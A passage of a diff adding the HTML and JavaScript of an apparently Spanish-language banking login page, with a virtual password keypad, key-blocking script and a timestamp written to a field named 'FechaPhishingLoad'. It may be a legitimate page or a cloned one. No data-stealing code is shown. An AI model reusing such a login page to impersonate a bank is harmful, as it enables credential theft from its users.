onmouseup="JavaScript:anadirLetra('TZxmpv0wxMs=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>0<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('RtP4dgZcNrU=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>1<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td></tr><tr><td>&nbsp;</td><td><a onmouseup="JavaScript:anadirLetra('uD6WWYmlJWw=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>6<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td>&nbsp;</td></tr></tbody></table></div>
+			<div id="A_DIV" style="display: none;"><table class="teclad"><tbody><tr><td><a onmouseup="JavaScript:anadirLetra('KFMDwPcKxrg=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>*<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('18ibVPlVH1o=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>*<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('g5lIfce23Q4=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>*<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td></tr><tr><td><a onmouseup="JavaScript:anadirLetra('ME8K+FNzX54=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>*<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('+GOatOIpWVQ=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>*<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('DTkzkxnMNMM=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>*<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td></tr><tr><td><a onmouseup="JavaScript:anadirLetra('FwUvvrEwlgU=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>*<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('TZxmpv0wxMs=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>*<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('RtP4dgZcNrU=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>*<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td></tr><tr><td>&nbsp;</td><td><a onmouseup="JavaScript:anadirLetra('uD6WWYmlJWw=','0',12);" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>*<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td>&nbsp;</td></tr></tbody></table></div>
+		  </td>
+		</tr>
+      </tbody></table>
+    </td>
+    <td align="left" valign="top" width="226">
+    <table cellspacing="0" cellpadding="0" border="0">
+  		<tbody><tr> 
+		    <td class="up">
+    
+		    <input class="cajatexto" type="hidden" name="OPASSWORD">
+		    <input class="cajatexto" type="password" autocomplete="OFF" readonly="readonly" value="" maxlength="12" name="VOPASSWORD" size="12" onmouseover="JavaScript:SHOWA ();" onmouseout="JavaScript:SHOWN ();">
+    
+		    </td>
+		  </tr>
+		</tbody></table>
+    </td>
+  </tr>
+</tbody></table>
+
+<table border="0" cellspacing="0" cellpadding="0" width="100%">
+
+  <tbody><tr>
+      	<td width="29">
+	</td>
+	<td height="20" width="125">
+		<table class="buttond">
+	 	  <tbody><tr>
+			 <td align="left" height="32">				
+				<a href="javascript:quitarLetra ( 12,'0' );" onmouseover="JavaScript:SHOWATODOS();" onmouseout="JavaScript:SHOWNTODOS();" onmousemove="return tituloBarra();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>Limpiar Clave<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a>
+			 </td>
+		  </tr>
+		</tbody></table>
+	</td>
+
+	<td height="20" width="441">
+		<table class="buttond">
+			<tbody>
+				<tr>
+					<td align="left" height="32">
+						<a href="javascript:enviar();" onmouseover="JavaScript:SHOWATODOS();" onmouseout="JavaScript:SHOWNTODOS();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>Aceptar<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a>
+					</td>
+				</tr>
+			</tbody>
+		</table>
+	</td>
+	<td align="left" height="20" width="23%"></td>
+	</tr>
+	
+  <tr> 
+    <td width="29">
+	</td>
+    <td height="20" width="125">
+	     <table border="0" class="buttond">
+    	    <tbody><tr>
+        		<td height="20">
+					<a href="javascript:self.close();" onmouseover="JavaScript:SHOWATODOS();" onmouseout="JavaScript:SHOWNTODOS();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>Cerrar<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a>        	   		
+        		</td>
+	        </tr>
+     	  </tbody></table>
+    </td>
+    <td width="441">
+	</td>
+	<td width="174">
+	</td>
+  </tr>  
+
+
+</tbody></table>
+
+
+
+
+
+
+<script>
+getTableN();
+getTableA();
+getTableLetraN();
+getTableLetraA();
+</script>
+<script language="JavaScript">
+  //Deshabilitar teclas 
+  document.onkeydown = function(event){  		
+	
+	var alt=false;
+	var ctrl=false;
+	var kcode;		
+	var navegador="";
+	if(event)
+	{	
+		if(event.which)//Netscape    	
+		{
+			navegador="N";
+		    kcode=event.which; 	
+			
+			//Tecla Alt presionada
+			if(event.altKey)
+	  	   	  alt=true;
+
+			//Tecla Control presionada
+			if(event.ctrlKey)
+	  	   	  ctrl=true;
+		}
+	}
+	else
+	if(window.event.keyCode)//Internet Explorer 	
+	{
+		navegador="IE";
+	    kcode=window.event.keyCode; 
+		
+		//Tecla Alt presionada
+		if(window.event.altKey)
+	  	  alt=true;
+
+		//Tecla Control presionada
+		if(window.event.ctrlKey)
+	  	  ctrl=true;
+	}
+
+	//alert(kcode)
+	
+
+	//Deshabilia Alt + Flecha Izq y/o Der (Atras, Adelante)
+	if(alt==true && (kcode==37 || kcode==39))
+	{				  
+		return false;				
+	}
+
+	//Deshabilia Contol + C,V,X (Copiar, Pegar, Cortar)
+	if(ctrl==true && (kcode==67 || kcode==86 || kcode==88))
+	{
+		return false;
+	}
+
+	//Deshabilia F1 -> F12
+	if (kcode >= 112 && kcode <= 123)
+	{ 		
+		if(navegador=="N")
+		{				  
+		   return false;		
+		}
+		else
+		if(navegador=="IE")
+		{		   			   
+		   window.event.keyCode = 505;
+		   return false;  
+		}
+	} 
+		
+
+	if (kcode == 8) //BackSpace
+	{ 
+		valor = document.activeElement.value; 
+
+		if (valor==undefined) //Evita Back en página. 
+		{ 
+			if(navegador=="N")//Netscape 
+			{
+			  event.preventDefault();
+ 		      event.returnValue = false;
+			}
+			return false;
+		}
+		else 
+		{ 	
+			var type = document.activeElement.type;
+			type = type.toUpperCase();					
+
+			if (type=='SELECT-ONE') //Evita Back en select. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else
+			if (type=='BUTTON') //Evita Back en button. 
+			{
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='RADIO') //Evita Back en radio. 
+			{
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='CHECKBOX') //Evita Back en checkbox. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='FILE') //Evita Back en file. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='RESET') //Evita Back en reset. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='SUBMIT') //Evita Back en submit. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			} 
+			else //Text, textarea o password 
+			{ 
+			    if (document.activeElement.value.length==0) //No realiza el backspace(largo igual a 0). 
+			    { 
+					if(navegador=="N")//Netscape 
+					{
+					  event.preventDefault();
+		 		      event.returnValue = false;
+					}
+					return false;	
+				}
+			    /*else //Realiza el backspace. 
+			    { 
+				  document.activeElement.value.keyCode = 8; 
+				}*/ 
+			} 
+			
+		} 
+	} 
+
+   }//fin desabilitar teclas 
+
+</script>
+
+<script>
+var fecha=new Date();
+var diames=fecha.getDate();
+var mes=fecha.getMonth() +1 ;
+var ano=fecha.getFullYear();
+var fechaLogLoad = "[" + diames + "/" + mes + "/" + ano + " " + fecha + "]";
+document.forms[0].FechaPhishingLoad.value = fechaLogLoad;
+</script>
+
+</div></form></body></html>
